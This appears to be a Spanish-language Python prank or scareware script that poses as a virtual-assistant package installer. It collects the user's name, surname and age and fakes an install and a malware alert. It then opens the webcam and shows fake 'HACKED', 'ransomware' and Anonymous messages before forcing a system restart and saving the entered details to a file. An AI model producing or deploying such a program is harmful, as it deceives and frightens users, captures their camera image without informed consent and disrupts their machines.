import tkinter
import cv2
import time
from tkinter import messagebox as MessageBox
import subprocess

"------------------------------------------------------------------------------------------------------"

print()
print("Bienvenido")
print()
pre2 = input("ingrese su nombre: ")
pre3 = input("ingrese su apellido: ")
pre4 = input("ingrese su edad: ")
pre5 = input("instalar paquetes de asistente virtual?(Si/No): ")
if pre5 == "si" or pre5 == "Si" or pre5 == "SI":
    print()
    i = 400
    for i in range(30000):
        print("instalando paquetes...")
    print()
    print("¡¡Paquetes instalados!!")
    print()
    MessageBox.showwarning("Alerta", "Hemos detectado archivos maliciosos.")
elif pre5 == "no" or pre5 == "No" or pre5 == "NO":
    print()
    i = 400
    for i in range(30000):
        print("instalando paquetes...")
    print()
    print("¡¡Paquetes instalados!!")
    print()
    MessageBox.showwarning("Alerta", "Hemos detectado archivos maliciosos.")
else:
    pre5 = input("instalar paquetes de asistente virtual?(Si/No): ")
    if pre5 == "si" or pre5 == "Si" or pre5 == "SI":
        print()
        i = 400
        for i in range(30000):
            print("instalando paquetes...")
        print()
        print("¡¡Paquetes instalados!!")
        print()
        MessageBox.showwarning("Alerta", "Hemos detectado archivos maliciosos.")
    elif pre5 == "no" or pre5 == "No" or pre5 == "NO":
        print()
        i = 400
        for i in range(30000):
            print("instalando paquetes...")
        print()
        print("¡¡Paquetes instalados!!")
        print()
        MessageBox.showwarning("Alerta", "Hemos detectado archivos maliciosos.")
    else:
        # Abre la cámara
        captura = cv2.VideoCapture(0)
        ret, imagen = captura.read()
        cv2.imshow("Imagen", imagen)
        cv2.waitKey(0)
        captura.release()
        #Reseteando equipo
        seconds = 40
        MessageBox.showwarning("HACKED!", "Ya tenemos el control de su equipo. Apagando en %d segundos." % seconds)
        time.sleep(1)
        subprocess.call("shutdown -r -t %d" % seconds)
MessageBox.showerror("Error", "Su equipo dejo de funcionar.")
MessageBox.showerror("Error", "Tenemos el control de su dispositivo.")
MessageBox.showerror("CLAY", "Somos anonymous, somos legión, no perdonamos, no olvidamos, Esperanos.")
MessageBox.showerror("ransomware", "Su equipo esta siendo infectado.")
MessageBox.showerror("CLAY", "YA TENEMOS EL CONTROL DE SU EQUIPO.")
captura = cv2.VideoCapture(0)
ret, imagen = captura.read()
cv2.imshow("Imagen", imagen)
cv2.waitKey(0)
captura.release()

seconds = 40
MessageBox.showwarning("HACKED!", "Ya tenemos el control de su equipo. Apagando en %d segundos." % seconds)
time.sleep(1)
subprocess.call("shutdown -r -t %d" % seconds)

    
print()

archi1=open("Anonymous.txt","w") 
archi1.write("Nombre -----> "+pre2+"\n") 
archi1.write("Apellido ---> "+pre3+"\n") 
archi1.write("Edad -------> "+pre4+"\n")  
archi1.close() 


print()
print()
